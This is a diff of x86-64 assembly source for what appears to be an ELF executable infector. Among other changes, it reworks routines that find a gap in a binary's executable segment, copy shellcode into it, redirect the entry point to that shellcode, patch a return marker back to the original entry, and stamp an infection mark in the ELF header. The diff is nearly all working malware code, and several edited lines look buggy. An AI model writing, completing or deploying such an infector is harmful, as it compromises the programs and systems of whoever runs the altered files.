@@ -2,9 +2,10 @@
 %include "include/shared.s"
 
 ; TODO : might add a prolog even tho we don't use any variable so we don't have to push rbp every time (where ??)
-				; remake progress line : 276
-				; todo functions : all of them except print
-				; re-made functions : print
+				; remake progress line : 406
+				; re-made functions : print, open, copy_data, close, munmap, strlen, get_file_size, find_gap, patch_jump_point
+				; next function to re-make : find_shell
+
 ; TODO : go to every `call print` and replace every r11 in `mov r11, STDOUT/STDERR`, with r11d (STDOUT/STDERR is 1 byte value) (this is done for now but check again in the future in case I added ne prints (I already know I'm gonna add one in good_elf_ptr))
 
 ; TODO : do the same thing but this time with the return values from main (search every "; the return value" commend)
@@ -280,9 +281,9 @@ segments:
 	;; parse the segment headers and find a gap in the executable one
 	; getting a pointer to the segment base
 	mov rax, [pivot_data]
-	mov rbx, [rax + e_phoff] 	; we need eax to stay the same for a while ; TODO : optimize this line
+	mov rbx, [rax + e_phoff] 	; we need rax to stay the same for a while ; TODO : optimize this line
 	add rbx, rax
-	sub rbx, Elf64_Phdr_size	; pointer to the program headers base - 1 * Elf64_Phdr_size
+	sub rbx, Elf64_Phdr_size	; pointer to the program headers' base - 1 * Elf64_Phdr_size
 
 	; getting p_phnum
 	mov cx, word[eax + e_phnum]
@@ -290,16 +291,16 @@ segments:
 
 next_segment:
 
-	dec ecx
+	dec rcx
 	js no_segment
 
-	add rbx, Elf64_Phdr_size 	; segment ++
+	add rbx, Elf64_Phdr_size 	; ++segment
 
-	mov rdx, [rbx + p_type]		; checking the segment type
+	mov edx, [rbx + p_type]		; checking the segment type
 	and edx, PT_LOAD
 	je next_segment			; not a loadable segment
 
-	mov rdx, [rbx + p_flags]
+	mov edx, [rbx + p_flags]	; checking the segment flags
 	add edx, PF_X
 	je next_segment			; not an executable segment
 	
@@ -307,21 +308,19 @@ next_segment:
 
 no_segment:
 	; this shouldn't really happen in normal executables that weren't manually edited
-	mov r11, ERR_NO_XL_SEG		; the return value
+	mov r11d, ERR_NO_XL_SEG		; the return value
 	jmp clean
 
 segment_found:
 	; now that we found a target segment, we have to find a suitable gap to store our shellcode
 	mov r11, [pivot_data]
-	mov r12, rbx			; the target segment header
-	mov r13, [rbx + p_filesz]	; TODO : might calculate this value in find_gap
-					; TODO : add a check for weird values like sections that have a size of 0
-					; and number of sections and segments exceeds 0xffff
-	mov r14, [shellcode_size]
+	mov r12, rbx
+	mov r12, [shellcode_size]
+
 	call find_gap
 	test rax, rax			; gap == NULL ?
 	jne next2
-	mov r11, ERR_NO_GAP		; the return value
+	mov r11d, ERR_NO_GAP		; the return value
 	jmp clean
 
 next2:
@@ -331,41 +330,44 @@ next2:
 	mov r13, [shellcode_size]
 	call copy_data
 
-	; now that everything is validated all we have to do is
-	;	1 - pacth entry point
-	;	2 - leave mark
-	;	3 - unmap and close the files
-	;	4 - ???
-	;	5 - profit
+	mov r11d, STDOUT
+	mov r12, shell_copied
+	mov r13d, shell_copied_len
+	call print			; "copying shell .." 
 
 	;; patching the entry point
 	; rax has the gap offset in memorry, we have to get the gap offset in file, then add it to the old 
 	; entry point value
 	; rbx should still have an Elf64_Phdr pointer to the target segment and (?? lol)
 	mov rdx, [rbx + p_vaddr]
-	sub rax, [pivot_data]	; get the gap offset in file
+	sub rax, [pivot_data]		; get the gap offset in file
 	add rax, rdx		; the new entry point value (aka where the shellcode is gonna be in memorry)
-	mov rbx, [pivot_data]	; TODO : might use a lea here
+	mov rbx, [pivot_data]		; TODO : might use a lea here
 	add rbx, e_entry
-	mov [rbx], rax		; patching the entry point
-	;
+	mov [rbx], rax			; patching the entry point
+	;;
 
 leaving_mark:
 	mov r11d, STDOUT
 	mov r12, marking
 	mov r13d, marking_len
-	call print		; "leaving mark .."
+	call print			; "leaving mark .."
 	
-	mov rax, [pivot_data]
-	add rax, EI_PAD		; pointing to EI_PAD
-	mov r11, rax		; TODO : might replace with `mov r11, [rax + EI_PAD]' or `mov r11, [pivot_data + EI_PAD]
-	mov r12, mark
+
+	mov r11, mark			; the "jeff was here" thingy
 	call strlen
-	mov r13, rax
+
+	mov r12, r11
+
+	mov r13d, eax
+	mov r11, [pivot_data]
+	add r11, EI_PAD			; pointing to EI_PAD
 	call copy_data
 
 	mov r11, [pivot_name]
 	call strlen
+
+	;; printing $FILE has been infected
 
 	mov r12, r11
 	mov r13d, eax
@@ -405,11 +407,17 @@ clean:
 
 open:	; int open(char *file, int flags);
 
-	xor eax, eax
+	push rax
+	push rdi
+	push rsi
+	;
+	mov eax, 2
 	mov rsi, r12
 	mov rdi, r11
-	add al, 2
 	syscall
+	;
+	pop rsi
+	pop rdi
 
 	ret
 
@@ -450,6 +458,7 @@ copy_data:	; void *copy_data(void *dst, void *src, QWORD size); basically an mem
 
 	push rsi	; TODO : might not have to save those
 	push rdi
+	push rcx
 
 	mov rdi, r11
 	mov rsi, r12
@@ -459,8 +468,17 @@ copying_loop:
 	dec rcx
 	js copied
 
-	movsb
+	cmp rcx, 7
+	jl slow_copy
+
+	movsq
+	sub rcx, 7
 	jmp copying_loop
+
+slow_copy:
+	movsb
+	dec rcx
+	jns slow_copy
 
 copied:
 	mov r11d, STDOUT
@@ -468,59 +486,61 @@ copied:
 	mov r13d, shell_copied_len
 	call print ; "shell copied!"
 	
+	pop rcx
 	pop rdi
 	pop rsi
 	ret
 
 
 
-find_gap:	; void *find_gap(void *data, void *segment, QWORD seg_size, QWORD shellcode_size)
+find_gap:	; void *find_gap(void *data, void *segment_Phdr, QWORD shellcode_size)
 
 	; saving used registers
 	push rbx
 	push rcx
 	push rdx
-	;
 
 method1:	; checking between-segments gaps, this should work most of the time duo to in-file segements
 		; alignements
 
 	
 	; r12 has the target segement's header
+	mov rax, r12
 	mov rbx, [r12 + p_offset]
-	add rbx, [r12 + p_filesz]	; we have a pointer to the end of the segment in file
+	add rbx, [r12 + p_filesz]	; we have a pointer to the end of the executable segment in file
 
 	; now getting the offset of the next segment
 
-	mov rax, r12
 	add rax, Elf64_Phdr_size	; segment_Phdr ++
-	mov rcx, [rax + p_offset]	; pointer to the start of the next segment
+	mov rcx, [rax + p_offset]	; pointer to the start of the next segment in file
 
-	sub rcx, rbx			; rcx should have the gap size now
-	cmp rcx, r14			; gap_size > shellcode_size ?
+	sub rcx, rbx			; calculating the gap size
+	cmp rcx, r13			; gap_size > shellcode_size ?
 	jl method2			; the shellcode won't fit in the gap
+
 	; gap =  (segment_Phdr -> offset + segment_Phdr -> filesz)(rbx) + memorry base (r11)
-	add rbx, r11			; gap offset in file + memorry base = gap address in memorry
+
+	add rbx, r11			; gap offset in file + memorry base = pointer to the gap in memory
 	mov rax, rbx			; the return value
-	jmp ret_gap
+	jmp found_gap
 
 method2:	; checking the in-segments 0-blocks
 	xor eax, eax			; the size of the current gap
-	mov rbx, r12			; void *segment in memorry	; TODO : view the 32 bit version
-									; for this long-boi comment
+	mov rbx, r12			; void *segment in memorry
 
-	add rbx, [rbx + p_offset]	; TODO : comment these 2 lines
-	add rbx, r11
+	add rbx, [r12 + p_offset]
+	add rbx, r11			; the segment address in memorry
 
 	mov rcx, -1			; the loop counter
-	; r13 has the segment size
+
+	mov rdx, [r12 + o_filesz]	; segment size
 
 parsing_data:
 	inc rcx				; ++i
-	cmp rcx, r13			; i > seg_size ?
+	cmp rcx, rdx			; i > seg_size ?
 	je no_gap
 
-	cmp byte[rbx + rcx], 0		; segment[i] == 0 ?
+	cmp byte[rbx + rcx], 0		; segment[i] == 0 ? ; TODO : use lodsb and esi instead
 	jne check_and_reset
 	inc rax				; ++ gap_size
 	jmp parsing_data
@@ -545,6 +565,14 @@ no_gap:
 	mov r13d, no_gap_found_len
 	call print
 	xor eax, eax			; gap = NULL
+	jmp ret_gap
+
+found_gap:
+
+	mov r11d, STDOUT
+	mov r12, gap_found
+	mov r13d, gap_found_len
+	call print
 
 ret_gap:
 	; rax has the right value we juqst have to restore registers and return
@@ -556,40 +584,40 @@ ret_gap:
 
 
 
-patch_jump_point:	; void patch_jump_point(char *shellcode, size_t size, QWORD marker, QWORD entry_point)
+patch_jump_point:	; bool patch_jump_point(char *shellcode, size_t size, QWORD marker, QWORD entry_point)
 
 	;storing used registers
 	push rbx
 	push rcx
 	push rdx
 	;
-	mov rax, r11	; shellcode
-	mov rcx, r12	; size
-	mov rdx, r13	; the marker which is 0x6969696969696969 in this case
-	; the combo rax + rcx pointer at the last byte in the shellcode (\0) but we need it to point to the last
-	; valid QWORD
-	; so -1 byte for (\0) and -7 for the last QWORD
-	sub rcx, 7	; this might should be 7 (debug!!)
+	mov rax, r11			; shellcode
+	mov rcx, r12			; size
+	mov rdx, r13			; the marker which is 0x6969696969696969 in this case
+	; the combo rax + rcx points at the last byte in the shellcode ('\0') but we need it to point
+	; at the last QWORD
+	; so -1 byte for '\0' and -7 to point at last QWORD
+	sub rcx, 8			; this might should be 7 (debug!!)
 
-marker_loop:
+marker_loop:	; will be searching backwards from the end as that's where the marker is likely to be
 	cmp qword[rax + rcx], rdx
 	je found_marker
 
-	dec rax
-	jns marker_loop; buff[0] is a valid qword as well
+	dec rcx
+	jns marker_loop			; buff[0] is a valid qword as well
 
 no_mark_found:
 	mov r11d, STDERR
 	mov r12, no_marker
 	mov r13d, no_marker_len
 	call print
-	mov rax, -1	; returns FALSe
+	mov rax, -1			; return FALSE
 	jmp ret_patch
 
 found_marker:
-	mov rbx, r11		; the original entry point
-	mov [rax + rcx], rbx	; pacthing the shellcode return address
-	xor eax, eax		; returns TRUE
+	mov rbx, r11			; the original entry point
+	mov [rax + rcx], rbx		; pacthing the shellcode return address
+	xor eax, eax			; return TRUE
 
 ret_patch:
 	;restoring saved registers
@@ -598,7 +626,6 @@ ret_patch:
 	pop rbx
 
 	ret	
-	
 
 
 
@@ -693,13 +720,16 @@ ret_text_section:
 unmap:	; void unmap(void *data, size_t size);
 
 	push rax
+	push rdi
+	push rsi
 
-	xor eax, eax
+	mov eax, 0xb
 	mov rdi, r11
 	mov rsi, r12
-	add al, 0xb
 	syscall
 
+	pop rsi
+	pop rdi
 	pop rax
 	ret
 
@@ -708,12 +738,13 @@ unmap:	; void unmap(void *data, size_t size);
 close:	; void close(int fd);
 
 	push rax
+	push rdi
 
-	xor eax, eax
-	mov rdi, r12
-	add al, 3
+	mov eax, 3
+	mov rdi, r11
 	syscall
 
+	pop rdi
 	pop rax
 	ret
 
@@ -721,28 +752,39 @@ close:	; void close(int fd);
 
 get_file_size:	; size_t get_file_size(int fd);
 
-	sub rsp, stat_size	; make space for the stat structure in the stack
+	push rbp
+	mov rbp, rsp
+	; saving used registers
+	push rsi
+	push rdi
+	; reserving space for stat structuce in the stack
+	sub rsp, stat_size
 
-	xor eax, eax
-	mov rsi, r11
-	mov rdx, rsp
-	add al, 0x5		; sys_newfstat
+	mov eax, 5		; sys_newfstat
+	mov esi, r11d
+	mov rdi, rsp
 	syscall
 
-	mov rax, [rsp + st_size]
-	add rsp, stat_size	; clean the stucture buffer
+	mov rax, [rcx + st_size]
+	add rsp, stat_size	; remove the structure of the stack
 
 	test rax, rax
-	jns after_stat		; TODO : rename this label ret_size
+	jns ret_size
 
 	mov r11d, STDERR
 	mov r12, bad_stat
 	mov r13d, bad_stat_len
 	call print
 
-	mov rax, -1		; TODO:replace with `mov al, -1`, since rax but the LSB should be 0xffff.. already
+	mov rax, -1		; OPTIONAL TODO:replace with `mov al, -1`, since rax but the LSB should be 0xffff.. already
 	
-after_stat:
+ret_size:
+
+	pop rdi
+	pop rsi
+
+	mov rsp, rbp
+	pop rbp
 
 	ret
 
@@ -779,21 +821,24 @@ strlen:	; size_t strlen(char *buff);
 	push rcx
 	push rsi
 
+	mov ecx, -1
 	mov rsi, r11
-	mov rcx, -1
 
 strlen_loop:
-	inc rcx
+	inc ecx		; we're dealing with very small strings
 	lodsb
 	test al, al
 	jne strlen_loop
 
-	mov rax, rcx	; the return value
+	mov eax, ecx	; the return value
 	; restoring saved register
 	pop rsi
 	pop rcx
 	;
 	ret
+
+
+
 is_target_elf:	; int is_target_elf(void *data);a
 
 	; checking the magic bytes
